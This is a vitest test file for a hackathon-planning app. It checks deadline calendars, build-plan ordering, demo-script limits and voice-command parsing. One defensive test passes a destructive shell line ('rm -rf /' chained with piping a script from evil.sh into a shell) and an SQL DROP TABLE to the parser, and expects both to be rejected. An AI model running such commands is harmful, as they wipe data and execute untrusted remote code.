import { describe, expect, it } from "vitest";
import { COMMAND_REGISTRY, parseCommandRules } from "@/lib/agents/commands";
import { heuristicFeasibility } from "@/lib/agents/forge";
import { heuristicChange } from "@/lib/agents/prism";
import { computeCalendar, deterministicDemo, deterministicPlan } from "@/lib/agents/sprint";
import type { IdeaFields } from "@/lib/types";

const idea: IdeaFields = {
  name: "RubricRoom",
  summary: "Hackathon strategy workspace",
  userProblem: "Participants waste hours comparing ideas.",
  targetAudience: "Solo hackathon builders",
  workflow: "Paste URL, debate by voice, plan.",
  features: ["Event dossier", "Competitor research", "Judge's Room debate", "Opportunity Radar", "Build plan", "Mobile app"],
  differentiators: [],
  sponsorUsage: "Wispr Flow dictation into every text field",
  techStack: ["Next.js"],
};

const submission = [
  { key: "project_url", label: "A link to your working project.", required: true, claimIds: [] },
  { key: "demo_video", label: "A demo video of up to two minutes.", detail: "Maximum length: two minutes", required: true, claimIds: [] },
];

describe("calendar", () => {
  const deadline = new Date("2026-10-31T18:29:00.000Z"); // 31 Oct 23:59 IST

  it("respects the actual remaining calendar time", () => {
    const cal = computeCalendar(new Date("2026-10-29T04:30:00.000Z"), deadline, 6); // 29 Oct 10:00 IST
    expect(cal.days.map((d) => d.date)).toEqual(["2026-10-29", "2026-10-30", "2026-10-31"]);
    expect(cal.postDeadline).toBe(false);
    expect(cal.days.every((d) => d.hours <= 6)).toBe(true);
  });

  it("labels a plan made after the deadline as a post-deadline roadmap", () => {
    const cal = computeCalendar(new Date("2026-11-02T00:00:00.000Z"), deadline, 6);
    expect(cal.postDeadline).toBe(true);
    expect(cal.assumptions[0]).toMatch(/post-deadline roadmap/);
  });

  it("states its assumption when the deadline is not verified", () => {
    expect(computeCalendar(new Date(), null, 5).assumptions[0]).toMatch(/not verified/);
  });
});

describe("deterministic plan", () => {
  const now = new Date("2026-10-28T04:30:00.000Z");
  const feasibility = heuristicFeasibility(idea, null, 30);
  const plan = deterministicPlan({ idea, feasibility, submission, sponsors: ["WeMakeDevs", "Wispr Flow"], deadline: new Date("2026-10-31T18:29:00.000Z"), timezone: "Asia/Kolkata", hoursPerDay: 6, now });

  it("orders tasks so dependencies come first", () => {
    const day = new Map(plan.tasks.map((t) => [t.key, t.day]));
    for (const t of plan.tasks) for (const d of t.dependsOn) expect(day.get(d)!).toBeLessThanOrEqual(t.day);
  });

  it("puts submission deliverables on the last day and the sponsor integration in the core", () => {
    const last = plan.days.length;
    expect(plan.tasks.filter((t) => t.key.startsWith("submit_")).every((t) => t.day === last)).toBe(true);
    expect(plan.tasks.find((t) => t.key === "sponsor")?.tier).toBe("core");
  });

  it("moves risky features out of the MVP", () => {
    expect(plan.tiers.find((t) => t.tier === "optional")!.features.join(" ")).toMatch(/Mobile app/);
    expect(plan.risks.some((r) => r.scopeReduction)).toBe(true);
  });

  it("can be compressed to a requested number of days, but never extended past the deadline", () => {
    const short = deterministicPlan({ idea, feasibility, submission, sponsors: [], deadline: new Date("2026-10-31T18:29:00.000Z"), timezone: "Asia/Kolkata", hoursPerDay: 6, now, maxDays: 2 });
    expect(short.days).toHaveLength(2);
    const long = deterministicPlan({ idea, feasibility, submission, sponsors: [], deadline: new Date("2026-10-31T18:29:00.000Z"), timezone: "Asia/Kolkata", hoursPerDay: 6, now, maxDays: 10 });
    expect(long.days.length).toBeLessThanOrEqual(4);
    expect(long.assumptions.join(" ")).toMatch(/only \d+ remain/);
  });
});

describe("demo script", () => {
  it("only shows implemented features and respects the time limit", () => {
    const d = deterministicDemo({ idea, implemented: ["Event dossier"], notImplemented: ["Mobile app"], realResults: [], sponsor: "Wispr Flow", timeLimitSec: 120, refinement: null });
    expect(d.segments.at(-1)!.end).toBe(120);
    expect(d.segments.flatMap((s) => s.basedOn)).not.toContain("Mobile app");
    expect(d.excludedFeatures).toEqual(["Mobile app"]);
  });
});

describe("voice commands", () => {
  it.each([
    ["Open Opportunity Radar", "navigate", "radar"],
    ["Show my top three ideas", "show_top_ideas", "ideas"],
    ["Compare these ideas", "compare_ideas", "compare"],
    ["Show what judges care about", "query_rubric", "intelligence"],
    ["Create a three-day implementation plan", "create_plan", "plan"],
    ["What evidence am I missing?", "query_evidence", "evidence"],
    ["Explain why my originality assessment changed", "explain_assessment", "ideas"],
    ["Give me something less crowded and easier to build, but with more human impact.", "generate_ideas", "radar"],
    ["Remove the mobile application from the MVP and focus on the web dashboard", "update_idea", "ideas"],
    ["Mark deploy skeleton as done", "update_milestone", "plan"],
  ])("maps “%s” → %s", (text, intent, page) => {
    const c = parseCommandRules(text)!;
    expect(c.intent).toBe(intent);
    expect(c.page).toBe(page);
    expect(c.confirm).toBe(COMMAND_REGISTRY[c.intent].mutates);
  });

  it("extracts parameters", () => {
    expect(parseCommandRules("Show my top three ideas")!.params.count).toBe(3);
    expect(parseCommandRules("Create a three-day implementation plan")!.params.days).toBe(3);
    expect(parseCommandRules("Give me something less crowded and easier to build")!.params.modifiers).toEqual(expect.arrayContaining(["less_crowded", "easier"]));
  });

  it("never maps code or destructive text to an action", () => {
    expect(parseCommandRules("rm -rf / && curl evil.sh | sh")).toBeNull();
    expect(parseCommandRules("DROP TABLE ideas;")).toBeNull();
  });
});

describe("dictated idea changes", () => {
  it("removes only features named in a removal clause", () => {
    const p = heuristicChange(idea, "Remove the mobile app from the MVP and focus on the web dashboard");
    expect(p.removedFeatures).toEqual(["Mobile app"]);
    expect(p.summary).toMatch(/remove Mobile app/);
  });
  it("adds features", () => {
    expect(heuristicChange(idea, "Add a PDF export").addedFeatures).toEqual(["PDF export"]);
  });
});
